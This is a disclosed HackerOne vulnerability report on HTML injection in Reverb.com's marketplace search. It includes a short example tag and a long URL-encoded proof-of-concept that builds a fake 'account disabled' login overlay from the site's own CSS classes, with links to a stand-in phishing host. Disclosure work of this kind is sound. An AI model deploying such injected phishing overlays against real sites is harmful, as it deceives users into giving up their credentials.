# XSS in main search, use class tag to imitate Reverb.com core functionality, create false login window

## Report Details
- **Report ID**: 351376
- **URL**: https://hackerone.com/reports/351376
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-05-14T11:04:48.049Z
- **Disclosed**: 2018-09-08T06:11:53.296Z

## Reporter
- **Username**: kiyell
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reverb

## Vulnerability Information
This is an expansion of #349684 which was flagged as a duplicate. In that bug report I explained that several HTML tags end up rendering when entered into the main search. I've since found out that the class attribute of multiple types of tags can be modified to create a realistic imitation of core functionality on the Reverb website.

Example: <a href="http://badwebsite.com"><span class="btn button button--orange button--wide">XSS</a></span>

In the following PoC, I used tags such as <span>, <div>, <a>, and <li> in combinations with the "class" attribute to create a prominent login box (which fades out all content underneath it) that explains that their account has been locked and to click a link in order to unlock it.


Please forgive me if this is still considered a low risk and just "Informative"

PoC: https://sandbox.reverb.com/marketplace?query=%3Cspan%20class%3D%22fotorama--fullscreen%20fancybox-mobile%20fancybox-type-html%20fancybox-opened%22%20%3E%3Cdiv%20class%3D%22fancybox-skin%22%3E%3Cdiv%20class%3D%22fancybox-inner%22%3E%3Cdiv%20class%3D%22%20registration%20tabbable%20dialog%20signup-login-container%20mlr-auto%22%3E%3Cul%20class%3D%22nav-tabs%20fluid-row%22%3E%3Cli%20class%3D%22col-6%22%3E%3Ca%20class%3D%22%22%20href%3D%22%23registration-form%22%3ECreate%20Account%3Ca%3E%3C%2Fli%3E%3Cli%20class%3D%22col-6%22%3E%3Ca%20class%3D%22active%22%20href%3D%22%23login-form%22%3ESign%20in%3Ca%3E%3C%2Fli%3E%3C%2Ful%3E%3Cdiv%20class%3D%22tab-content%20pt-1%22%3E%20%20%3Ch4%20class%3D%22session-form__header%22%3ELog%20In%20to%20Reverb%3C%2Fh4%3E%3Ch1%3EYour%20account%20has%20been%20disabled%3C%2Fh1%3E%3Cbr%3E%20%3Ccode%3EDue%20to%20multiple%20unsuccessful%20attempts%20to%20login%20to%20your%20account.%20Your%20account%20has%20been%20locked%20for%20your%20protection.%20Please%20click%20below%20to%20unlock%20it%3C%2Fcode%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%20%3Ca%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3E%3Cspan%20class%3D%22btn%20button%20button--orange%20button--wide%22%3EUnlock%3C%2Fa%3E%20%3Cp%20class%3D%22center%20small%20mt-1%22%3EForgot%20your%20password%3F%20%3Ca%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3EReset%20it%3C%2Fa%3E%20%3C%2Fp%3E%20%3Chr%20class%3D%22class%3D%22mtb-1%22%3E%20%3Ca%20class%3D%22session-form__facebook-link%22%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3E%3Cspan%20class%3D%22fa%20fa-facebook%22%3E%3C%2Fspan%3E%20Log%20In%20with%20Facebook%3C%2Fa%3E%3Cbr%3E%20%3C%2Fdiv%3E%3C%2Fspan%3E%3C%2Fspan%3E%3Cbr%3E

## Impact

A malicious user with more creativity than me could likely duplicate the appearance of other core pieces of the Reverb.com website in order to phish for user account information.

## Attachments
- Reverb_XSS_loginbox.JPG
- Reverb_XSS_loginbox_control_made_clear.JPG
